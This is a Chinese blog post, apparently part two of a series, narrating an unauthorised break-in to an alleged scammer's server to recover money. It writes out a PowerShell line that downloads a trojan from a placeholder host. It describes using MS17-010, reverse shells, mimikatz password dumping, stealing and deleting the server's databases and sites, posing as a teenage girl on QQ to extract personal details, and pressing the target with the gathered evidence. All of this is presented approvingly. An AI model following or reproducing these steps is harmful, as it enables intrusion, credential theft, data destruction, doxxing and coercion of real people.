## 01 拿下目标

**接着上一篇——《[如何优雅地追回被骗款项（上篇）](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652849317&idx=1&sn=911cedd94b46deeffa1c84897bc2580a&chksm=bd5938688a2eb17e6312f792b8a73c8684199d4004f6066d0031e8f546e6c928f4cdca46be87&scene=21#wechat_redirect)》，经过极其恶心的过程，我们拿下了目标c段的一台服务器，并且通过扫描，确定了对方的服务器存在永恒之蓝。**

关于ms17010这个洞，估计很多人都可以秒破，我们团队里面移植了简单版的payload到win下，比较方便，但是功能比较少，只有反弹shell，关闭防火墙，和把administrator的密码置空，虽然功能较少，但是胜在稳定，蓝屏的概率比较少。

![图片.png](https://image.3001.net/images/20181213/1544693290_5c12262a11025.png!small)

然后nc一下就可以了

![图片.png](https://image.3001.net/images/20181213/1544693301_5c122635990d6.png!small)

直接就是sys权限并不需要提权，我们可以在这里直接添加账号登陆，但是我并不希望留下太大的痕迹，我选择挂msf的马，然后读取administrator的密码。

那么，问题来了，在dos中，如何下载木马呢，我又不想建个账号登陆上去，其实非常简单，老司机在渗透win的时候，很多时候powershell会有比较好的体验。

首先startpowershell 开启powshell

Then

$client.DownloadFile('http:/[www.xxx.com/moza.exe](http://www.xxx.com/moza.exe)','C:/moza.exe')即可远程down下我的木马到c盘根目录。

![图片.png](https://image.3001.net/images/20181213/1544693308_5c12263ca8641.png!small)

由于我上传的是msf的马子，所以得在服务端监听一下。

![图片.png](https://image.3001.net/images/20181213/1544693317_5c12264575041.png!small)

然后dos下运行我的木马

![图片.png](https://image.3001.net/images/20181213/1544693323_5c12264bd3b75.png!small)

连接上去之后，直接导入mimikatz，如下图。

![图片.png](https://image.3001.net/images/20181213/1544693329_5c1226518aa2b.png!small)

但是不知道为什么读取不出来。

![图片.png](https://image.3001.net/images/20181213/1544693336_5c1226581fddf.png!small)

![图片.png](https://image.3001.net/images/20181213/1544693341_5c12265d37b44.png!small)

所以我们换个思路，直接upload一个过去，然后在c段我们所控制的电脑中，再反弹一个shell回来，进行操作，到这里我才想起，其实当初我可以直接用powershll下载mimikatz的

Orz。。

上传指令非常简单，如下

![图片.png](https://image.3001.net/images/20181213/1544693347_5c1226631812a.png!small)

然后直接再msf里面执行shell就好了，懒得回那边的机子。

首先提权。

![图片.png](https://image.3001.net/images/20181213/1544693353_5c1226692b4e7.png!small)

然后读取密码。

![图片.png](https://image.3001.net/images/20181213/1544693360_5c122670162e2.png!small)

然后登陆！

![图片.png](https://image.3001.net/images/20181213/1544693370_5c12267a1c68f.png!small)

非常开心，然后想着去脱数据库，下载源码，看看能否找到有用的信息。但是在那一瞬间，不到2分钟，我被挤下去了！

![图片.png](https://image.3001.net/images/20181213/1544693377_5c122681b8be9.png!small)

## 02 被发现了！

Orz。。。。

在那一瞬间，我突然想起其实有三种情况。

  1. 只是巧合，对方压根就不知道我登陆了，只是碰巧他上线把我逼下去了。

  2. 目标那时候刚好在线，而我把他挤下去了（还是考虑的不够完善）

  3. 目标有异地登陆提醒，及时上来把我给挤下去了。

我并没有继续尝试上线，我的msf马经过免杀的，他要找出来还是需要一点时间，除非他down掉整个服务器，我们这时候只需要dump下mysql的data与www目录就好了。

我事先进入shell中查看了www的目录但是发现里面的站点似乎有点多，没时间来找寻是哪个了，就全部down下来再说。

![图片.png](https://image.3001.net/images/20181213/1544693393_5c1226912c1cc.png!small)

mysql的数据库同理。

![图片.png](https://image.3001.net/images/20181213/1544693405_5c12269d31928.png!small)

把他服务器上的数据网站全部删掉。（为民除害）

这里得先kill掉占用文件的进程，图没找到就不放了。。

![图片.png](https://image.3001.net/images/20181213/1544693411_5c1226a3ac991.png!small)

删库跑路贼刺激。

![图片.png](https://image.3001.net/images/20181213/1544693417_5c1226a92b4a5.png!small)

我翻了一下服务器，并没有找到一些有用的数据，打算在www与data中找寻有用的信息，我对用户的数据不感兴趣，我们这趟渗透测目的是拿到坑我朋友钱的幕后boss信息。

本地还原网站与数据库。然后我找了一下数据，发现全都是用户的注册信息，对我来说没啥用。不过管理员的账号倒是找到了。

## 03 社会工程学

![图片.png](https://image.3001.net/images/20181213/1544693423_5c1226afb6f6f.png!small)

zxl这个很可能是站主的名字缩写，但是范围太大，我们无法确定，继续往下搜索。

在主站的数据库中找了半天，啥都没有发现。

![图片.png](https://image.3001.net/images/20181213/1544693431_5c1226b78b2fb.png!small)

我并没有放弃，继续在别的站中找寻，在config文件中找到了数据库的另一个用户，

![图片.png](https://image.3001.net/images/20181213/1544693438_5c1226be4dfc3.png!small)

得到了一串数字，神似qq号，先保存下来。

继续找寻，找到几个客服小姐姐的qq。

到时候再跟朋友确定一下是否是同一个。

在这个站的数据库中发现管理员的密码hash与上述数据库连接密码一致。

![图片.png](https://image.3001.net/images/20181213/1544693449_5c1226c95cb25.png!small)

解密如下

![图片.png](https://image.3001.net/images/20181213/1544693454_5c1226ce6f580.png!small)

找了半个钟，没哈有用信息，手机号或者其他之类的。

整理一下我们下载得到的信息。

> 名字缩写：zxl
>
> QQ号码：9xxxxxxx1
>
> 客服小姐姐qq两个：xxxxxxxx与aaaaaa

先搜索一下9开头的这个。

![图片.png](https://image.3001.net/images/20181213/1544693495_5c1226f70801a.png!small)

头像是我以前玩dnf时候的鬼泣，这年头用鬼剑做头像的要么是重度毒奶粉玩家，要么就是常年不换头像的大佬。

百度搜一下他qq，得到贴吧账号。

![图片.png](https://image.3001.net/images/20181213/1544693501_5c1226fd94e05.png!small)

得到某学院，目测学校就是这里，不过是三年前的了，应该毕业了。

没有发多少有用的帖子，尝试从贴吧好友中找寻线索。

![图片.png](https://image.3001.net/images/20181213/1544693508_5c122704ce4c8.png!small)

找寻了很久，在他的关注中找到此人，关注的贴吧也有他那个学校，目测两人可能认识，并且此人很喜欢在各大交友吧玩耍，是个不错的入口。

## 04 我是大x萌妹

借了一个女性朋友的qq，改了一下年龄，然后加他。

![图片.png](https://image.3001.net/images/20181213/1544693521_5c12271145cd5.png!small)

假扮成高一的妹子，hhhhh我果然是个天才。

![图片.png](https://image.3001.net/images/20181213/1544693528_5c122718c22d9.png!small)

不太懂这个圈子里的情况，不过感觉纯粹交友的估计没多少...

然后以了解他为理由，套路到了空间的访问权限。

![图片.png](https://image.3001.net/images/20181213/1544693580_5c12274c762e0.png!small)

PS（我果然有女装的天赋hhhhhh）

找了大半天在很久远的某天说说上找到了目标qq的评论。

很激动，没有找错人。

![图片.png](https://image.3001.net/images/20181213/1544693589_5c12275546751.png!small)

跟他混熟了两天之后，开始疯狂的套路之旅。

![图片.png](https://image.3001.net/images/20181213/1544693598_5c12275ecbbca.png!small)

有戏，继续往下。

![图片.png](https://image.3001.net/images/20181213/1544693605_5c122765cc96b.png!small)

得到名字与专业。

![图片.png](https://image.3001.net/images/20181213/1544693613_5c12276d4d00b.png!small)

应该是今年刚毕业，xx学校汽修专业。

手机号码，没啥好的理由问，怕露出马脚。而且很可能也没有手机号，在这个微信泛滥的时代。

突然想起qq群这个思路。

直接搜索qq群搜索xxx学校汽修。

成功套路入群。

![图片.png](https://image.3001.net/images/20181213/1544693626_5c12277abf950.png!small)

得到通讯录，得到手机号码：1xxxxxxxxxxx。

得到的信息已经足够多了，可以去加对方了。

但是为了确定这个站是团伙还是个人，我还是决定肝一波。

加上他的qq得到ip地址。

![图片.png](https://image.3001.net/images/20181213/1544693633_5c122781a3d59.png!small)

再加客服小姐姐的qq。

![图片.png](https://image.3001.net/images/20181213/1544693642_5c12278ac5bc3.png!small)

同一个ip地址，版本号都一样，应该是一个人。

接下来就是丢证据，逼迫还钱的时候了。

![图片.png](https://image.3001.net/images/20181213/1544693651_5c122793e2c93.png!small)

握住命脉一切好说。

![图片.png](https://image.3001.net/images/20181213/1544693658_5c12279ac8e5a.png!small)

后来钱拿回来之后，我认真看了一下数据库，其实还真的有一些刷单的兼职，金额不大，不到立案的标准，并且后续在他朋友那了解到此人家中似乎还有个病重的母亲，就没有报警处理，相信这次事情过后，他会有新的开始吧。

## 05 总结

希望大家跟我一样，做个好人呀

End.

